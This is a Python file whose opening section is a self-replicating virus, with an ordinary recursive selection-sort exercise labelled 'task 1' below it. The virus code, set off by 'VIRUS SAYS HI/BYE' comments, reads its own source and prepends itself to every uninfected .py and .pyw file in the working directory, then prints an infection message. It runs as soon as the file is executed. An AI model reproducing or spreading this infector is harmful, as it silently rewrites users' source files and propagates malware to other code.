# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!

#task 1
def mini(arr,idx,size):
  if idx == size:
    return idx
  k = mini(arr,idx+1,size)
  if arr[idx] < arr[k]:
    return idx
  else:
    return k

def selection(arr,idx,size):
  if idx == size:
    return -1
  else:
     k = mini(arr,idx,size-1)
     # print(k)
     arr[k], arr[idx] = arr[idx], arr[k]
     selection(arr,idx+1,size)


# list1 = [-2, 45, 0, 11, -9]
list1 = [2, 4, 1, 6, 3]
selection(list1,0,5)
print(list1)